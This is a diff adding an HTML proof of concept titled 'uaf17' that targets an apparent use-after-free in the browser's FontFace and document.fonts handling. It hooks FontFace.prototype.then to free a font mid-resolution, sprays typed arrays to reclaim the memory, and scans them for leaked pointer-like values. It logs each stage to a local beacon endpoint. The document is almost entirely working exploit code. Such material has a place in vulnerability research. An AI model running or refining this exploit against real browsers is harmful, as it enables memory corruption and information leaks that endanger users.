@@ -1,0 +1,68 @@
+<!doctype html><meta charset="utf-8"><title>uaf17</title><body><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(u,o){var s='';for(var i=0;i<8;i++){s+=('0'+u[o+i].toString(16)).slice(-2)}return s}
+function qw(u,o){var lo=(u[o]|(u[o+1]<<8)|(u[o+2]<<16)|(u[o+3]<<24))>>>0;
+  var hi=(u[o+4]|(u[o+5]<<8)|(u[o+6]<<16)|(u[o+7]<<24))>>>0;return [lo,hi];}
+var TRIAL=0, MAXT=1, styleEl=null, firedHere=false, SPRAY=null;
+function setup(){
+  var name='q'+TRIAL;
+  var A=new FontFace(name,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive=window.__alive||[]; window.__alive.push(A);
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: t"+TRIAL+"; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  b('U17-T'+TRIAL+'-SETUP');
+  firedHere=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if (firedHere) return undefined;
+      firedHere=true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight;
+      var CLASSES=[64,80,96,112,128,144,160,192,224,256];
+      SPRAY=[];
+      for (var c=0;c<CLASSES.length;c++){
+        var k=CLASSES[c], arr=[];
+        for (var j=0;j<16;j++) arr.push(new Uint8Array(k));
+        SPRAY.push([k,arr]);
+      }
+      var r='err';
+      try { r=document.fonts.check('1em t'+TRIAL); } catch(e){ r='throw'; }
+      b('U17-T'+TRIAL+'-SPRAYED-'+r);
+      return undefined;
+    },
+    set:function(){}
+  });
+  document.fonts.load('1em '+name+', t'+TRIAL,'AB').then(
+    function(){ b('U17-T'+TRIAL+'-RESOLVED'); setTimeout(scan,80); },
+    function(){ b('U17-T'+TRIAL+'-REJECTED'); setTimeout(scan,80); }
+  );
+  b('U17-T'+TRIAL+'-LOAD-CALLED');
+}
+function scan(){
+  var ptr=0, written=0;
+  for (var c=0;c<SPRAY.length;c++){
+    var k=SPRAY[c][0], arr=SPRAY[c][1];
+    for (var j=0;j<arr.length;j++){
+      var u=arr[j], nz=[], wp=[];
+      for (var o=0;o+8<=k;o+=8){
+        var q=qw(u,o);
+        if (q[0]||q[1]){
+          nz.push(o.toString(16)+':'+hex8(u,o));
+          if (q[1]>0 && q[1]<0x1000){ wp.push(o.toString(16)); ptr++; }
+        }
+      }
+      if (wp.length){ b('U17-PTR-s'+k+'-b'+j+'-o'+wp.join('_')+'-'+nz.slice(0,4).join('_')); }
+      else if (nz.length){ written++; b('U17-NZ-s'+k+'-b'+j+'-n'+nz.length+'-'+nz.slice(0,4).join('_')); }
+    }
+  }
+  b('U17-DONE-ptr-'+ptr+'-written-'+written);
+}
+function run(){ b('U17-PARSE'); setup(); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></body>
